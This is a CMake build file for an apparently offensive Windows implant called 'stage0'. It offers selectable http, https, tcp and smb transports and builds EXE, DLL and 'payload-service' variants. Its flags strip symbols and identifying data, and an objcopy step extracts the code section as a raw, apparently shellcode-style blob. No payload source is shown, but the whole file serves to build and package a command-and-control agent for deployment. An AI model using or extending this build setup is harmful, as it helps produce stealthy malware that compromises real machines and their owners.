cmake_minimum_required(VERSION 3.20)
project(stage0 C)

set(CMAKE_C_STANDARD 11)
set(CMAKE_C_STANDARD_REQUIRED ON)

option(STAGE0_DEBUG "Enable diagnostic output" OFF)
set(STAGE0_TRANSPORT "1" CACHE STRING "1=http, 2=https, 3=tcp, 4=smb")
set(BLUESHELL_CONFIG "" CACHE FILEPATH "Native build configuration")
find_package(Python3 REQUIRED COMPONENTS Interpreter)
if(NOT BLUESHELL_CONFIG)
  set(BLUESHELL_CONFIG "${CMAKE_CURRENT_SOURCE_DIR}/build-config.json")
endif()
set(GENERATED_DIR "${CMAKE_CURRENT_BINARY_DIR}/generated")
file(MAKE_DIRECTORY "${GENERATED_DIR}")
execute_process(
  COMMAND ${Python3_EXECUTABLE} "${CMAKE_CURRENT_SOURCE_DIR}/configure.py"
          "${BLUESHELL_CONFIG}" "${GENERATED_DIR}/generated_config.h"
  COMMAND_ERROR_IS_FATAL ANY)

set(STAGE0_SOURCES
    src/core.c
    src/message.c
    src/tasks.c
    src/transport.c
    src/entry.c)

add_library(stage0_core OBJECT ${STAGE0_SOURCES})
target_include_directories(stage0_core PUBLIC include "${GENERATED_DIR}")
target_compile_definitions(stage0_core PRIVATE
    WIN32_LEAN_AND_MEAN NOMINMAX
    STAGE0_TRANSPORT=${STAGE0_TRANSPORT}
    $<$<BOOL:${STAGE0_DEBUG}>:STAGE0_DEBUG=1>)
target_compile_options(stage0_core PRIVATE
    -Os -ffunction-sections -fdata-sections -fno-ident
    $<$<CONFIG:Release>:-fno-asynchronous-unwind-tables>)

add_executable(stage0_exe $<TARGET_OBJECTS:stage0_core>)
target_link_libraries(stage0_exe PRIVATE ws2_32 winhttp advapi32)
target_link_options(stage0_exe PRIVATE -Wl,--gc-sections -Wl,--strip-all)
set_target_properties(stage0_exe PROPERTIES OUTPUT_NAME stage0)

add_library(stage0_dll SHARED $<TARGET_OBJECTS:stage0_core>)
target_compile_definitions(stage0_core PRIVATE STAGE0_BUILD_DLL=1)
target_link_libraries(stage0_dll PRIVATE ws2_32 winhttp advapi32)
target_link_options(stage0_dll PRIVATE -Wl,--gc-sections -Wl,--strip-all)
set_target_properties(stage0_dll PROPERTIES OUTPUT_NAME stage0 PREFIX "")

add_executable(stage0_service $<TARGET_OBJECTS:stage0_core>)
target_link_libraries(stage0_service PRIVATE ws2_32 winhttp advapi32)
target_link_options(stage0_service PRIVATE -Wl,--gc-sections -Wl,--strip-all)
set_target_properties(stage0_service PROPERTIES OUTPUT_NAME payload-service)

find_program(OBJCOPY NAMES x86_64-w64-mingw32-objcopy llvm-objcopy objcopy)
if(OBJCOPY)
  add_custom_command(OUTPUT ${CMAKE_CURRENT_BINARY_DIR}/stage0.raw
    COMMAND ${OBJCOPY} -O binary --only-section=.text
            $<TARGET_FILE:stage0_exe> ${CMAKE_CURRENT_BINARY_DIR}/stage0.raw
    DEPENDS stage0_exe VERBATIM)
  add_custom_target(stage0_raw DEPENDS ${CMAKE_CURRENT_BINARY_DIR}/stage0.raw)
endif()
